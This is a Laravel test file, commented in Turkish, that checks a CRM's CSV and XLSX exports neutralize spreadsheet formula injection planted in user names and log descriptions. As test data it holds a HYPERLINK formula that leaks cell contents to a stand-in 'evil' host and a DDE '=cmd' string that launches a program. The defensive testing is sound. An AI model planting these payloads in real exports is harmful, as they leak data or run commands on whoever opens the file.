<?php

namespace Tests\Feature\Security;

use App\Exports\ActivityLogsExport;
use App\Models\Deal;
use App\Models\PipelineStage;
use App\Models\SessionLog;
use App\Models\User;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Notification;
use Maatwebsite\Excel\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Spatie\Activitylog\Models\Activity as ActivityLog;
use Tests\TestCase;

/**
 * Faz 13 / İz A5.6 (§4-F1, §7-H2) — CSV/XLSX formül enjeksiyonu regresyonu.
 *
 * Senaryo: kimliği doğrulanmış herhangi bir kullanıcı kendi görünen adını
 * (`User.name`) veya bir aktivite açıklamasını (`description`) formül
 * kalıbına çevirebilir; bu değer başka bir kullanıcının (ör. admin'in)
 * çektiği export'a düşer. Burada uçtan uca (gerçek HTTP export endpoint'i)
 * doğrulanan şey: bu hücreler CSV gövdesinde `'` ile nötrlenmiş çıkıyor mu.
 *
 * CSV gövdesi ham substring yerine `str_getcsv` ile PARSE edilerek
 * doğrulanır — bazı payload'lar (`"..."` içeren HYPERLINK örneği gibi)
 * `fputcsv` tarafından RFC 4180 kaçışına (iç tırnakların ikizlenmesi +
 * alanın tırnaklanması) tabi tutulur; ham string arama bu durumda yanlış
 * negatif üretir.
 *
 * XLSX yolu HTTP üzerinden DEĞİL `Excel::raw()` ile doğrulanır — Laravel'in
 * test istemcisi `BinaryFileResponse`'un gövdesini `TestResponse::getContent()`
 * ile vermez (bkz. ReportApiTest::test_export_xlsx_returns_a_binary_spreadsheet,
 * orada da yalnız header kontrol edilir); gerçek hücre TİPİNİ/DEĞERİNİ görmek
 * için PhpSpreadsheet'i doğrudan sürmek gerekir.
 */
class CsvFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolePermissionSeeder::class);
        Notification::fake();
    }

    private function actorWithPermissions(array $permissions): User
    {
        $user = User::factory()->create();
        $user->givePermissionTo($permissions);

        return $user;
    }

    /**
     * UTF-8 BOM'u atar, satırları `str_getcsv` ile alan dizilerine çevirir.
     *
     * @return array<int, array<int, string>>
     */
    private function parseCsvRows(string $content): array
    {
        $withoutBom = str_starts_with($content, "\xEF\xBB\xBF") ? substr($content, 3) : $content;

        $lines = array_values(array_filter(
            preg_split('/\r\n|\n|\r/', $withoutBom),
            fn ($line) => $line !== ''
        ));

        return array_map(fn ($line) => str_getcsv($line), $lines);
    }

    // ---------------------------------------------------------------
    // Log CSV export — LogQueryService::exportCsv()
    // ---------------------------------------------------------------

    public function test_session_log_csv_export_neutralizes_malicious_user_name(): void
    {
        $actor = $this->actorWithPermissions(['logs.view', 'logs.export']);

        $attacker = User::factory()->create(['name' => '=HYPERLINK("http://evil/"&A1)']);
        SessionLog::factory()->login()->create(['user_id' => $attacker->id, 'email' => $attacker->email]);

        $response = $this->actingAs($actor)->get('/api/logs/export?type=sessions&format=csv');
        $response->assertOk();

        $rows = $this->parseCsvRows($response->streamedContent());

        // csvShape('sessions') sırası: id, user_id, user_name, email, ...
        $this->assertSame('user_name', $rows[0][2]);
        $this->assertSame('\'=HYPERLINK("http://evil/"&A1)', $rows[1][2]);
    }

    public function test_activity_log_csv_export_neutralizes_a_battery_of_dangerous_prefixes(): void
    {
        $actor = $this->actorWithPermissions(['logs.view', 'logs.export']);

        $payloads = [
            '=HYPERLINK("http://evil/"&A1)',
            '+1+1',
            '@SUM(A1)',
            "\tzararlı",
        ];

        foreach ($payloads as $payload) {
            ActivityLog::create([
                'log_name' => 'default',
                'description' => $payload,
                'event' => 'updated',
                'properties' => [],
            ]);
        }

        $response = $this->actingAs($actor)->get('/api/logs/export?type=activities&format=csv');
        $response->assertOk();

        $rows = $this->parseCsvRows($response->streamedContent());

        // csvShape('activities') sırası: id, log_name, event, description, ...
        $this->assertSame('description', $rows[0][3]);

        $descriptions = array_map(fn ($row) => $row[3], array_slice($rows, 1));

        foreach ($payloads as $payload) {
            $this->assertContains("'".$payload, $descriptions, "Nötrlenmemiş bulundu: {$payload}");
        }
    }

    // ---------------------------------------------------------------
    // Log XLSX export — app/Exports/ActivityLogsExport.php
    // ---------------------------------------------------------------

    public function test_activity_log_xlsx_export_neutralizes_formula_and_keeps_it_as_plain_text(): void
    {
        ActivityLog::create([
            'log_name' => 'default',
            'description' => '=HYPERLINK("http://evil/"&A1)',
            'event' => 'updated',
            'properties' => [],
        ]);

        $query = ActivityLog::query()->orderBy('id');
        $export = new ActivityLogsExport($query);

        $bytes = \Maatwebsite\Excel\Facades\Excel::raw($export, Excel::XLSX);

        $tmpPath = tempnam(sys_get_temp_dir(), 'csvguard').'.xlsx';
        file_put_contents($tmpPath, $bytes);

        try {
            $spreadsheet = IOFactory::load($tmpPath);
            $sheet = $spreadsheet->getActiveSheet();

            // description sütunu 4. kolon (D); satır 2 (1 başlık + 1 veri).
            $cell = $sheet->getCell('D2');

            $this->assertSame(
                DataType::TYPE_STRING,
                $cell->getDataType(),
                'Nötrlenmemiş değer PhpSpreadsheet tarafından FORMÜL olarak yazılmış olabilir.'
            );
            $this->assertSame('\'=HYPERLINK("http://evil/"&A1)', $cell->getValue());
        } finally {
            @unlink($tmpPath);
        }
    }

    // ---------------------------------------------------------------
    // Rapor export — ReportExportService (kullanıcı adı yansıması)
    // ---------------------------------------------------------------

    public function test_user_performance_report_csv_export_neutralizes_malicious_owner_name(): void
    {
        $actor = $this->actorWithPermissions(['reports.view', 'reports.export']);

        $attackerOwner = User::factory()->create(['name' => "=cmd|' /C calc'!A1"]);
        $stage = PipelineStage::factory()->create(['is_won' => false, 'is_lost' => false]);

        Deal::factory()->won()->create([
            'pipeline_stage_id' => $stage->id,
            'owner_id' => $attackerOwner->id,
            'amount' => 1000,
            'closed_at' => '2026-06-05 10:00:00',
        ]);

        $response = $this->actingAs($actor)
            ->get('/api/reports/export?report=user-performance&format=csv&from=2026-06-01&to=2026-06-30');
        $response->assertOk();

        $rows = $this->parseCsvRows($response->streamedContent());

        // exportHeadings() sırası: Kullanıcı ID, Kullanıcı, Gelir, ...
        $this->assertSame('Kullanıcı', $rows[0][1]);
        $this->assertSame("'=cmd|' /C calc'!A1", $rows[1][1]);
    }

    /**
     * Karar 1'in uçtan uca regresyonu: rapor export'undaki GERÇEK bir tutar
     * guard tarafından bozulmamalı. Bu CRM'de `deals.amount` doğrulaması
     * (`StoreDealRequest`) negatif değeri reddettiği için gerçek veriden
     * negatif bir toplam üretmek mümkün değil — guard'ın "-1500.00" gibi
     * negatif STRING'i bozmadığının doğrudan kanıtı birim testindedir
     * (tests/Unit/CsvFormulaGuardTest.php). Burada uçtan uca doğrulanan:
     * export'a giren gerçek tutar hücresi hiç nötrlenmeden, AYNEN çıkıyor.
     */
    public function test_sales_performance_report_csv_export_keeps_revenue_amount_intact(): void
    {
        $actor = $this->actorWithPermissions(['reports.view', 'reports.export']);
        $stage = PipelineStage::factory()->create(['is_won' => false, 'is_lost' => false]);

        Deal::factory()->won()->create([
            'pipeline_stage_id' => $stage->id,
            'amount' => 1234.56,
            'closed_at' => '2026-06-05 10:00:00',
        ]);

        $response = $this->actingAs($actor)
            ->get('/api/reports/export?report=sales-performance&format=csv&from=2026-06-01&to=2026-06-30');
        $response->assertOk();

        $rows = $this->parseCsvRows($response->streamedContent());

        // exportHeadings() sırası: Dönem, Gelir, Kazanılan, Kaybedilen, Toplam
        $this->assertSame('Gelir', $rows[0][1]);
        $this->assertSame('1234.56', $rows[1][1]);
    }
}
